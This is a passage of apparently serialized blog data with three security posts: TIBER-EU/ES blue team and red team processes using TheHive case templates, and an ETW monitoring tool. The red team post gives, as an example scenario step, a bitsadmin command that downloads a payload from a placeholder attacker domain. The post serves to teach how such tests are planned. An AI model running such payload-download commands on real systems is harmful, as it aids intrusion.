services","permalink":"/jstnk9/blog/tags/financial-services"},{"label":"tiber-eu","permalink":"/jstnk9/blog/tags/tiber-eu"},{"label":"tiber-es","permalink":"/jstnk9/blog/tags/tiber-es"}],"readingTime":10.12,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Sigma Rules as MISP galaxies","permalink":"/jstnk9/blog/Sigma-Rules-as-MISP-galaxies"},"nextItem":{"title":"ETW-Almulahaza - new python-based tool","permalink":"/jstnk9/blog/ETW-Almulahaza"}},"content":"## TL;DR\\r\\n\\r\\nPrevious blogs: \\r\\n\\r\\n* [https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01](https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01)\\r\\n* [https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Red-Team-Series-01](https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Red-Team-Series-01)\\r\\n\\r\\nThis is the last entry related to TIBER-EU and TIBER-ES. So far we have seen the processes related to [Threat Intelligence](https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01) and [Red Team](https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Red-Team-Series-01). Now it is the turn to learn about the Blue Team process, which, unlike the last two, is the `Entity` Blue Team itself. This team can be outsourced or belong to `Entity` itself, and its objective is to detect and defend the `Entity` business in case of an attack.\\r\\n\\r\\nDuring the implementation of TIBER-EU, the Blue Team is not aware that any penetration test will be performed, so they must be able to detect the attacks performed by the Red Team provider. Subsequently, they must generate reports relating the Red Team\'s attacks to the Blue Team\'s findings.\\r\\n\\r\\nAs I did in the previous case, I have developed some cases in the **[The Hive](https://thehive-project.org/)**  tool so that blue team teams can import them quickly and know the different actions that they have to carry out, thus allowing the use of the Task logs to document and attach everything that they carry out on the test.\\r\\n\\r\\nThe developed cases contemplate all the phases that TIBER-EU mentions in its documentation, in addition I have also included good practices and ways of facing some phases.\\r\\n\\r\\nThe fact of using The Hive is due to the following reasons:\\r\\n\\r\\n- Allows to merge cases\\r\\n- Can be integrated with MISP\\r\\n- Can be integrated with Cortex and its analyzers\\r\\n- Case templates can be created\\r\\n\\r\\n**GitHub project**: https://github.com/jstnk9/TIBER-Cases\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Abbreviations\\r\\n\\r\\n| Key | Description |\\r\\n| ------ | ----------- |\\r\\n| Entity   | The term Entity during this blog and The Hive cases, refers to the entity that is going to carry out the TIBER-EU exercises. |\\r\\n| TI   | Threat Intelligence Provider. Is the provider of threat intelligence services for the Entity. |\\r\\n| RT | Red Team Provider. Is the provider of red teaming services for the Entity. |\\r\\n| WT    | White Team. Team responsible of the scope and operative execution of the exercises. |\\r\\n| BT    | Blue Team. Team without  knowledge about the exercise which have to respond to the attacks by the RT. |\\r\\n\\r\\n## Context\\r\\n\\r\\nDuring this blog I will not go into detail about what TIBER-EU or TIBER-ES is. I will simply mention that TIBER-EU is a European framework for testing red teaming with a threat intelligence approach. This approach is related to Lockheed Martin\'s well-known Intelligence Driven Defense\xae method.\\r\\n\\r\\nThe offensive tests will be from the perspective of actual attacks with procedures used by actors targeting the financial sector. For more information, I recommend reading the TIBER-EU and TIBER-ES guides.\\r\\n\\r\\n:::info\\r\\n\\r\\n**TIBER-EU Information: https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html**\\r\\n\\r\\n**TIBER-ES Information: https://www.bde.es/bde/es/secciones/servicios/tiber-es-3f6bfe7e907ed71.html**\\r\\n\\r\\n:::\\r\\n\\r\\n## Goal of this project and blog\\r\\n\\r\\nThe main objective of this project is to **help blue team analysts** during the blue team closure phase (so called by TIBER-EU). For this purpose, different cases are made available which can be imported into The Hive in order to speed up the work.\\r\\n\\r\\nFor this purpose, a total of 3 cases have been developed, which have sub-tasks assigned so that blue team analysts can execute their actions from there. Additionally, there are some tasks where the participation of red team and detection engineering analysts is required.\\r\\n\\r\\nFinally, in the phases and steps that come in this blog, I will not go into too much detail about what to do, since, in the very cases I have developed from The Hive, I put the necessary information for the analysts.\\r\\n\\r\\n## Process\\r\\n\\r\\nThe process that TIBER-EU defines for the blue team during the closure phase is as shown below:\\r\\n\\r\\n![tiberBlueTeam_process](https://jstnk9.github.io/jstnk9/img/blog-tiber03/process_bttiber.png)\\r\\n\\r\\nSource: ecb.europa.eu \\r\\n\\r\\nTo simplify the entire TIBER-EU document and the blue team section a bit, I wanted to make a process explaining the most important points of the framework for those analysts who are going to work on it. Specifically, I have focused on the \\"Processes/Activities Closure Phase\\" section of the official TIBER-EU process.\\r\\n\\r\\n![jstnk_tiber](https://jstnk9.github.io/jstnk9/img/blog-tiber03/bt_process.png)\\r\\n\\r\\n### Notify the blue team of the tests performed\\r\\n\\r\\n![rttestingplandark](https://jstnk9.github.io/jstnk9/img/blog-tiber03/01_dark.png#gh-dark-mode-only)![rttestingplanlight](https://jstnk9.github.io/jstnk9/img/blog-tiber03/01_white.png#gh-light-mode-only)\\r\\n\\r\\nFirst, after the red team has executed the tests as discussed in the [previous entry](https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Red-Team-Series-01), it must notify the blue team about the exercises performed.\\r\\n\\r\\nThe ideal scenario is that the blue team knows without warning that they are under attack (always, without knowing that the TIBER processes are running). This will mean that there are detection mechanisms in place for some of the steps performed by the red team.\\r\\n\\r\\nin any case, the blue team must know the tests that the red team performed during its testing phase once it is finished, and for this purpose, they must receive a copy of the complete report made by the red team (red team report).\\r\\n\\r\\nIn many cases, the blue team will be an internal `Entity` team, in other cases, this team will be an outsourced team providing services to the `Entity` being targeted by the TIBER-EU Framework.\\r\\n\\r\\n### Blue Team Report\\r\\n\\r\\n![methdark](https://jstnk9.github.io/jstnk9/img/blog-tiber03/02_dark.png#gh-dark-mode-only)![methlight](https://jstnk9.github.io/jstnk9/img/blog-tiber03/02_white.png#gh-light-mode-only)\\r\\n\\r\\nThis phase is very important for the blue team. \\r\\n\\r\\n**As a red teamer**, your goal is to help the blue team and explain in as much detail as possible the steps taken during the testing phase. Think that this collaboration with the blue team will be key to improve the security posture and minimize risks in the `Entity`.\\r\\n\\r\\n**As a blue teamer**, your objective is to relate each step taken by the red teamer to possible detections in your technology that evidence the step taken by the red teamer.\\r\\n\\r\\nBy detection we mean that there is some kind of notification or something similar where it indicates that suspicious behavior has been detected. Usually these detections cover some kind of pattern previously generated either by an `Entity` analyst or by the vendor providing the solution.\\r\\n\\r\\nOnce we have a list of those steps detected and those steps not detected, let\'s focus on those NOT detected. For those tests performed by the red team where there was no detection, we must ask ourselves the following question... **Did I not detect it because there is no visibility, or because there is no detection mechanism?**.\\r\\n\\r\\nFirst, it is advisable to review those gaps and map them to a data source, i.e., a technology or feature of the operating system that might know that the technique was executed. For example, if we are looking for process injection, we might have a chance for visibility through \\r\\n\\r\\n1. Windows API calls\\r\\n2. Process modification\\r\\n3. Process access\\r\\n\\r\\nAccording to ATT&CK MITRE, the above three points could help us to identify the T1055.003 technique. Therefore, as a blue teamer, we have to keep this information in mind so that later, in the next phases when the red team repeats the test, we look at those places where we can see the executed step. \\r\\n\\r\\n### Replay the test\\r\\n\\r\\n![repalydark](https://jstnk9.github.io/jstnk9/img/blog-tiber03/03_dark.png#gh-dark-mode-only)![repalywhite](https://jstnk9.github.io/jstnk9/img/blog-tiber03/03_white.png#gh-light-mode-only)\\r\\n\\r\\nIn this case, the blue teamers have to be able to at least see some kind of evidence in the steps repeated by the red team. That would mean that there is at least some kind of visibility.\\r\\n\\r\\nIn case there is no evidence on a step performed by the red team, it could mean that there is no visibility, which would mean either acquiring new technology to fill the gap or asking possible engineering teams from the `Entity` to fill the visibility gap.\\r\\n\\r\\nThere is a lot of technology and each one uses different formats for the generation of detections, therefore, it is recommended to use [SIGMA](https://github.com/SigmaHQ/sigma) Rules for those cases where the detection can be covered with this scheme. This could later help us when translating the detection to our technology using [sigmac](https://github.com/SigmaHQ/sigma/blob/master/tools/README.md) and/or [uncoder.io](https://uncoder.io/).\\r\\n\\r\\nFor the development of detections, there must be a previous investigation, where the analysts must be able to cover the required behavior and with the least possible number (or none at all) of false positives. In this way, we will avoid a lot of unnecessary noise and possible alert fatigue.\\r\\n\\r\\nFinally, the implementation of the developed detections should be carried out. In this case, there may be different teams responsible for this work, depending on each entity, the team may vary.\\r\\n\\r\\n### Remediation Plan and Test Summary Report\\r\\n\\r\\n![remedark](https://jstnk9.github.io/jstnk9/img/blog-tiber03/04_dark.png#gh-dark-mode-only)![remewhit](https://jstnk9.github.io/jstnk9/img/blog-tiber03/04_white.png#gh-light-mode-only)\\r\\n\\r\\nThe blue team is not the only stakeholder for this phase. In this case, IR, Threat Intelligence, SOC, Architecture teams, etc. must be involved and coordinated to develop a remediation plan based on those vulnerabilities and failures identified during the red team tests.\\r\\n\\r\\nThe reports that must be generated in this case are the following:\\r\\n\\r\\n1. **Remediation Plan**: The Remediation Plan is based on the test results, which should be used in turn to support the business case for implementing improvements to mitigate the vulnerabilities identified during the TIBER-EU test.\\r\\n\\r\\n2. **Test Summary Report**: The Test Summary Report summarises the overall test process and results (including the Remediation Plan) and should draw on the test documentation, such as the Red Team Test Report, the Blue Team Report, the TTI Report, the Red Team Test Plan and the Remediation Plan. The Test Summary Report should not contain detailed technical information and findings regarding weaknesses and vulnerabilities, as information at that level of detail is highly sensitive and for the entity only. The entity must share the Test Summary Report with the lead authority. The lead authority may also review the more detailed findings from the test if this is deemed necessary.\\r\\n\\r\\n\\r\\n## Import case in The Hive\\r\\n\\r\\nVersion of The Hive used:\\r\\n\\r\\n```yaml\\r\\nScalligraph: 0.1.0-SNAPSHOT\\r\\nTheHive: 4.1.18-1\\r\\nPlay: 2.8.7\\r\\n```\\r\\n\\r\\nBefore you begin, I highly recommend following the guide below to import the ATT&CK MITRE Matrix and MISP taxonomies into The Hive. To do this, go to the following links.\\r\\n\\r\\n:::info\\r\\n\\r\\nImport ATT&CK MITRE: https://docs.thehive-project.org/thehive/user-guides/administrators/tactics-techniques-procedures/\\r\\n\\r\\nImport MISP Taxonomies: https://docs.thehive-project.org/thehive/user-guides/administrators/tags-and-taxonomies/\\r\\n\\r\\n:::\\r\\n\\r\\nTo import the cases, you must have permissions to perform this task. To do this, you must first navigate to the `Organization` section that is located at the top next to the search bar.\\r\\n\\r\\n![step1](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial1.png)\\r\\n\\r\\nOnce inside that section, we will have to go to the section that says `Import template` and select the JSON files that are in my GitHub, specifically in the `cases` folder.\\r\\n\\r\\n![step2](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial2.png)\\r\\n\\r\\nOnce this is done, and when we click on the upper part where it says `+ New Case`, all the imported cases will appear with the information about the TIBER-EU phases.\\r\\n\\r\\n![step3](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial3.png)\\r\\n\\r\\n## Case previsualization\\r\\n\\r\\nAs an example, once the cases are imported and one is generated to start working on it, they look like the following image:\\r\\n\\r\\n![gtl_case](https://jstnk9.github.io/jstnk9/img/blog-tiber03/high_level_case.png)\\r\\n\\r\\nAs can be seen, it contains all the information the analyst needs to start working. The way cases are written is by using `markdown`.\\r\\n\\r\\nWhen clicking on `tasks`, the user can see the following information.\\r\\n\\r\\n![gtl_case_tasks](https://jstnk9.github.io/jstnk9/img/blog-tiber03/low_level_task.png)\\r\\n\\r\\nAll the Tasks that are included in each case have `dependencies` and `goals`, this will help the analysts not lose focus and focus on the goals to be achieved.\\r\\n\\r\\n### Cases information\\r\\n\\r\\nHere you can find basic information about the created cases. Case name is the name defined for each case. Each case has different tasks to complete. You\'ll find all the information in the json files.\\r\\n\\r\\nimport Tabs from \'@theme/Tabs\';\\r\\nimport TabItem from \'@theme/TabItem\';\\r\\nimport BrowserWindow from \'@site/src/components/BrowserWindow\';\\r\\n\\r\\n<BrowserWindow url=\\"http://thehive:9000/cases/\\">\\r\\n\\r\\n<Tabs>\\r\\n  <TabItem value=\\"Blue Team Report\\" label=\\"Blue Team Report\\" default>\\r\\n\\r\\n**Case name:** Closure Blue Team #1 - Report\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Inform key people</li>\\r\\n<li>Task #2 - Map red team\'s attacks with blue team detection</li>\\r\\n<li>Task #3 - Identify detection gaps</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/blue_team/Case-Template__Closure_phase__BT_Report.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n\\r\\n  <TabItem value=\\"Red Team Replay\\" label=\\"Red Team Replay\\">\\r\\n\\r\\n**Case name:** Closure Blue Team #2 - Replay\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Repeat those undetected steps by the blue team</li>\\r\\n<li>Task #2 - Check visibility</li>\\r\\n<li>Task #3 - Develop detection </li>\\r\\n<li>Task #4 - Implement Detections </li>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/blue_team/Case-Template__Closure_phase__BT_Replay.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n\\r\\n  <TabItem value=\\"Remediation Plan and Test Summary Report\\" label=\\"Remediation Plan and Test Summary Report\\">\\r\\n\\r\\n**Case name:**Closure Blue Team #3 - Remediation Plan and Test Summary Report\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Remediation Plan </li>\\r\\n<li>Task #2 - Test Summary Report</li>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/blue_team/Case-Template__Closure_phase__BT_Remediation_and_Summary.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n\\r\\n</Tabs>\\r\\n\\r\\n</BrowserWindow>\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/\\r\\n\\r\\n**GitHub Project**: https://github.com/jstnk9/TIBER-Cases"},{"id":"ETW-Almulahaza","metadata":{"permalink":"/jstnk9/blog/ETW-Almulahaza","source":"@site/blog/2022-06-24-ETW-Almulahaza/2022-06-24-ETW-Almulahaza.md","title":"ETW-Almulahaza - new python-based tool","description":"About the tool","date":"2022-06-24T00:00:00.000Z","formattedDate":"June 24, 2022","tags":[{"label":"etw","permalink":"/jstnk9/blog/tags/etw"},{"label":"visibility","permalink":"/jstnk9/blog/tags/visibility"},{"label":"detection","permalink":"/jstnk9/blog/tags/detection"},{"label":"microsoft","permalink":"/jstnk9/blog/tags/microsoft"},{"label":"windows","permalink":"/jstnk9/blog/tags/windows"}],"readingTime":1.65,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"TIBER-EU and TIBER-ES - Blue Team","permalink":"/jstnk9/blog/TIBER-EU-ES-Blue-Team-Series-01"},"nextItem":{"title":"TIBER-EU and TIBER-ES - Red Team","permalink":"/jstnk9/blog/TIBER-EU-ES-Red-Team-Series-01"}},"content":"## About the tool\\r\\n\\r\\nETW-Almulahaza is a python-based consumer tool that I\'ve created and I\'ll be updating that help you to monitor ETW traces to see what happens when you execute some malware o tool. This tools is based in [pywintrace](https://github.com/fireeye/pywintrace) of FireEye.\\r\\n\\r\\n> Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers. ETW is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features. [Microsoft documentation](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-).\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\nThe initial version (0.0.1) that I\'ve published right now currently supports monitoring of a specified PID or PIDs and also monitoring of explorer.exe. Also includes its childrens of the processes monitored and Thread IDs.\\r\\n\\r\\nSome of the features that I would like to add are as follows:\\r\\n- Add config file to specify providers to monitor and task names. This config file can be read during it execution.\\r\\n- Convert outputs in other formats to enable analysts and make it actionable during their operations. I am open to listen to proposals :).\\r\\n- Add providers on the fly to monitor new events, for example file events, registry events, defender events, etc.\\r\\n- Create graphical visualizations to see the genealogy of the processes and the events generated by each process (files created|read|modified, registry keys created|modified|deleted, etc.)\\r\\n- Identify possibly process injection and other techniques.\\r\\n- create logics according to the types of generated events.\\r\\n- And many other features!\\r\\n\\r\\nYou can see the Github project here: https://github.com/jstnk9/ETW-Almulahaza\\r\\n\\r\\n## Example\\r\\n\\r\\n![ptree](https://raw.githubusercontent.com/jstnk9/ETW-Almulahaza/main/img/process-tree.jpg)\\r\\n\\r\\nThe above image is an example of `cmd.exe` monitoring. As you can see all the threads and subprocesses generated by each one. Also, in case the processes are stopped, the terminal will update the result by adding the word \\"stopped\\".\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/\\r\\n\\r\\n**GitHub Project**: https://github.com/jstnk9/ETW-Almulahaza\\r\\n\\r\\n<h2> References and acknowledgments </h2>\\r\\n\\r\\n- https://www.fireeye.com/blog/threat-research/2017/09/pywintrace-python-wrapper-for-etw.html\\r\\n- https://github.com/nasbench/EVTX-ETW-Resources\\r\\n- [dfirence](https://twitter.com/dfirence)\\r\\n- Windows Internals Part 2 book.\\r\\n- https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-\\r\\n- https://github.com/fireeye/pywintrace"},{"id":"TIBER-EU-ES-Red-Team-Series-01","metadata":{"permalink":"/jstnk9/blog/TIBER-EU-ES-Red-Team-Series-01","source":"@site/blog/2022-04-11-TIBER-EUES-Red-Team-Series-01/2022-04-11-TIBER-EUES-Red-Team-Series-01.md","title":"TIBER-EU and TIBER-ES - Red Team","description":"TL;DR","date":"2022-04-11T00:00:00.000Z","formattedDate":"April 11, 2022","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"red team","permalink":"/jstnk9/blog/tags/red-team"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"risk","permalink":"/jstnk9/blog/tags/risk"},{"label":"threat modeling","permalink":"/jstnk9/blog/tags/threat-modeling"},{"label":"financial services","permalink":"/jstnk9/blog/tags/financial-services"},{"label":"tiber-eu","permalink":"/jstnk9/blog/tags/tiber-eu"},{"label":"tiber-es","permalink":"/jstnk9/blog/tags/tiber-es"}],"readingTime":9.86,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"ETW-Almulahaza - new python-based tool","permalink":"/jstnk9/blog/ETW-Almulahaza"},"nextItem":{"title":"TIBER-EU and TIBER-ES - Threat Intelligence (I)","permalink":"/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01"}},"content":"## TL;DR\\r\\n\\r\\nPrevious blog: https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01\\r\\n\\r\\nAfter posting the [first post](https://jstnk9.github.io/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01) in relation to TIBER-EU/ES from the point of view of the threat intelligence provider, now is the time to talk about the figure of the red team provider.\\r\\n\\r\\nThe purpose of the red team provider is to execute the final security test on the `Entity`. This execution will be supported by an extensive analysis previously carried out by the threat intelligence team where, among other cases, different scenarios are provided that should be executed, all of them with the perspective of a real attacker. Additionally, as we saw in the previous blog, the threat intelligence team provides a series of flags for the red team to obtain during its execution, thus motivating the execution.\\r\\n\\r\\nAs I did in the previous case, I have developed some cases in the **[The Hive](https://thehive-project.org/)** tool so that red team teams can import them quickly and know the different actions that they have to carry out, thus allowing the use of the `Task logs` to document and attach everything that they carry out on the test.\\r\\n\\r\\nThe developed cases contemplate all the phases that TIBER-EU mentions in its documentation, in addition I have also included good practices and ways of facing some phases.\\r\\n\\r\\nThe fact of using The Hive is due to the following reasons:\\r\\n- Allows to merge cases\\r\\n- Can be integrated with MISP\\r\\n- Can be integrated with Cortex and its analyzers\\r\\n- Case templates can be created\\r\\n\\r\\n**GitHub project**: https://github.com/jstnk9/TIBER-Cases\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Abbreviations\\r\\n\\r\\n| Key | Description |\\r\\n| ------ | ----------- |\\r\\n| Entity   | The term Entity during this blog and The Hive cases, refers to the entity that is going to carry out the TIBER-EU exercises. |\\r\\n| TI   | Threat Intelligence Provider. Is the provider of threat intelligence services for the Entity. |\\r\\n| RT | Red Team Provider. Is the provider of red teaming services for the Entity. |\\r\\n| WT    | White Team. Team responsible of the scope and operative execution of the exercises. |\\r\\n| BT    | Blue Team. Team without  knowledge about the exercise which have to respond to the attacks by the RT. |\\r\\n\\r\\n## Context\\r\\n\\r\\nDuring this blog I will not go into detail about what TIBER-EU or TIBER-ES is. I will simply mention that TIBER-EU is a European framework for testing red teaming with a threat intelligence approach. This approach is related to Lockheed Martin\'s well-known Intelligence Driven Defense\xae method.\\r\\n\\r\\nThe offensive tests will be from the perspective of actual attacks with procedures used by actors targeting the financial sector. For more information, I recommend reading the TIBER-EU and TIBER-ES guides.\\r\\n\\r\\n:::info\\r\\n\\r\\n**TIBER-EU Information: https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html**\\r\\n\\r\\n**TIBER-ES Information: https://www.bde.es/bde/es/secciones/servicios/tiber-es-3f6bfe7e907ed71.html**\\r\\n\\r\\n:::\\r\\n\\r\\n## Goal of this project and blog\\r\\n\\r\\nThe main objective of this project is to **help red team analysts** during the testing phase (testing phase is the name given by TIBER). To do this, different cases are made available that can be imported into The Hive and thus be able to speed up the work.\\r\\n\\r\\nFor this, a total of 3 cases have been developed (for the red team phase, 6 for the threat intelligence phase), which have assigned sub-tasks so that the red team analysts can execute their actions from there. Additionally, there are some tasks where the participation of threat intelligence analysts is required.\\r\\n\\r\\nFinally, in the phases and steps that come in this blog, it will not go into excessive detail about what needs to be done, since, in the cases that I have developed for The Hive, I put the necessary information for the threat intelligence analysts.\\r\\n\\r\\n\\r\\n## Process\\r\\n\\r\\nThe process that TIBER-EU makes available to the community is very interesting. The following image shows the activities carried out by the red team team within the testing phase.\\r\\n\\r\\n![tiberRedTeam_process](https://jstnk9.github.io/jstnk9/img/blog-tiber02/process_rttiber.png)\\r\\n\\r\\nSource: ecb.europa.eu \\r\\n\\r\\nTo simplify the entire TIBER-EU document and the red team section a bit, I wanted to make a process explaining the most important points of the framework for those analysts who are going to work on it. Specifically, I have focused on the \\"Processes/Activities Red Team Test\\" section of the official TIBER-EU process.\\r\\n\\r\\n![jstnk_tiber](https://jstnk9.github.io/jstnk9/img/blog-tiber02/rt_process.png)\\r\\n\\r\\n### Red team testing plan\\r\\n\\r\\n![rttestingplandark](https://jstnk9.github.io/jstnk9/img/blog-tiber02/rt_testingplan_dark.png#gh-dark-mode-only)![rttestingplanlight](https://jstnk9.github.io/jstnk9/img/blog-tiber02/rt_testingplan_light.png#gh-light-mode-only)\\r\\n\\r\\nThis first step tries to plan what the execution of the red team will be later. It is a purely planning phase, where the red team must **understand the scope** of the test to be carried out, that is, which assets enter and which assets do not enter during the testing. At the same time, the execution time of the tests must be defined, which may be affected depending on the previously defined scope. Finally, it is very important that the entire red team team that is going to participate in the tests read the `GTL` and `TTI` report generated by the threat intelligence team.\\r\\n\\r\\nOnce both reports are obtained and studied by the red team, sessions should be held with the threat intelligence team to discuss the following:\\r\\n\\r\\n1. Discuss the scenarios previously written by the threat intelligence team\\r\\n2. Align the objectives of the red team **with the real objectives of the actors**\\r\\n   2.1 Map the defined objectives of the actors with the critical functions of the `Entity`\\r\\n3. **Adapt the red team attack methodology to replicate real life scenarios that could be carried out by the actors**\\r\\n\\r\\nLike any security test, there may be some risk that the services of the target `Entity` of the test will be affected and become completely inaccessible. For this reason, it is important that the red team establishes a `risk plan` where it collects how to handle and communicate these situations in case they take place.\\r\\n\\r\\n### Testing methodology and scenarios\\r\\n\\r\\n![methdark](https://jstnk9.github.io/jstnk9/img/blog-tiber02/testingmeth_dark.png#gh-dark-mode-only)![methlight](https://jstnk9.github.io/jstnk9/img/blog-tiber02/testingmeth_light.png#gh-light-mode-only)\\r\\n\\r\\nThis phase aims to accommodate the scenarios written by the threat intelligence team and generate new ones by the red team. All the scenarios must have a relationship with the ATT&CK MITRE matrix, in order to be able to subsequently identify the level of scope performed in the test.\\r\\n\\r\\nAll scenarios must have both a high-level and a low-level vision, following the steps shown below.\\r\\n\\r\\n- **First of all, the use of the kill chain is highly recommended**, since it will be possible to separate the actions to be carried out for each phase, thus managing to assign different phases to different analysts and abstract them from the rest of the intrusion.\\r\\n- For each phase, a high-level description is recommended where it is said what objective is pursued. For example, `bitsadmin.exe execution to download a payload from a controlled server`. At the same time, there should be a low-level description of the procedure required to achieve this goal, in this case, it would be the execution of the command `bitsadmin.exe /transfer /Download /priority Foreground http://evildomain[.]com /file.dll myfile.dll`\\r\\n- Finally, indicate in the creation of the scenarios where the flags previously established by the threat intelligence team are located. This will help you not lose focus and achieve them.\\r\\n\\r\\nAll the developed scenarios could be affected at any time during the execution, either because there is some type of block that does not allow progress or because the activity of the red team has been detected.\\r\\n\\r\\n### Execution of the test\\r\\n\\r\\n![methdark](https://jstnk9.github.io/jstnk9/img/blog-tiber02/executiontest_dark.png#gh-dark-mode-only)![methlight](https://jstnk9.github.io/jstnk9/img/blog-tiber02/executiontest_light.png#gh-light-mode-only)\\r\\n\\r\\nThe last part of the red team process is the execution of all the previously planned scenarios.\\r\\n\\r\\nWhile we are executing the testing, there could be obstacles as mentioned above, for this reason, the red team has to be able to continue with the test and use new techniques if necessary.\\r\\n\\r\\n**During execution** the red team and threat intelligence team must have a constant conversation to share information back and forth. For example, if the red team identifies new systems or services, it must be transmitted to the threat intelligence team, which could provide new intelligence associated with said services. Likewise, if the threat intelligence team generates new intelligence during the test, it must be transmitted to the red team.\\r\\n\\r\\nAnother important fact to mention is that the red team must communicate at all times the steps it carries out to the white team, which must know all the details of the test.\\r\\n\\r\\n**After the execution** a final report must be created with all the details of the test. In the cases of The Hive you can see what information the report should contain. Once created, in order to be able to follow the entire TIBER process that will finally be covered with the next entry of Blue Team, the following steps must be carried out.\\r\\n\\r\\n- Coordinate a meeting with the blue team team to review the report. This is because it is important to see what was detected by the blue team and what was not.\\r\\n- The blue team must create their own report mapping their detections with the red team scenarios.\\r\\n- Schedule a retest by the red team once the blue team has implemented new detection measures, in order to see if they are valid or not.\\r\\n\\r\\n## The Hive\\r\\n\\r\\n### Import Case\\r\\n\\r\\nVersion of The Hive used:\\r\\n```yaml\\r\\nScalligraph: 0.1.0-SNAPSHOT\\r\\nTheHive: 4.1.18-1\\r\\nPlay: 2.8.7\\r\\n```\\r\\n\\r\\nBefore you begin, I highly recommend following the guide below to import the ATT&CK MITRE Matrix and MISP taxonomies into The Hive. To do this, go to the following links.\\r\\n\\r\\n:::info\\r\\n\\r\\nImport ATT&CK MITRE: https://docs.thehive-project.org/thehive/user-guides/administrators/tactics-techniques-procedures/\\r\\n\\r\\nImport MISP Taxonomies: https://docs.thehive-project.org/thehive/user-guides/administrators/tags-and-taxonomies/\\r\\n\\r\\n:::\\r\\n\\r\\nTo import the cases, you must have permissions to perform this task. To do this, you must first navigate to the `Organization` section that is located at the top next to the search bar.\\r\\n\\r\\n![step1](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial1.png)\\r\\n\\r\\nOnce inside that section, we will have to go to the section that says `Import template` and select the JSON files that are in my GitHub, specifically in the `cases` folder.\\r\\n\\r\\n![step2](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial2.png)\\r\\n\\r\\nOnce this is done, and when we click on the upper part where it says `+ New Case`, all the imported cases will appear with the information about the TIBER-EU phases.\\r\\n\\r\\n![step3](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial3.png)\\r\\n\\r\\n### Case visualization\\r\\n\\r\\nAs an example, once the cases are imported and one is generated to start working on it, they look like the following image:\\r\\n\\r\\n![gtl_case](https://jstnk9.github.io/jstnk9/img/blog-tiber02/thehiveredteam.png)\\r\\n\\r\\nAs can be seen, it contains all the information the analyst needs to start working. The way cases are written is by using `markdown`.\\r\\n\\r\\nWhen clicking on `tasks`, the user can see the following information.\\r\\n\\r\\n![gtl_case_tasks](https://jstnk9.github.io/jstnk9/img/blog-tiber02/thehiveredteam2.png)\\r\\n\\r\\nAll the Tasks that are included in each case have `dependencies` and `goals`, this will help the analysts not lose focus and focus on the goals to be achieved.\\r\\n\\r\\n### Cases information\\r\\n\\r\\nHere you can find basic information about the created cases. Case name is the name defined for each case. Each case has different tasks to complete. You\'ll find all the information in the json files.\\r\\n\\r\\nimport Tabs from \'@theme/Tabs\';\\r\\nimport TabItem from \'@theme/TabItem\';\\r\\nimport BrowserWindow from \'@site/src/components/BrowserWindow\';\\r\\n\\r\\n<BrowserWindow 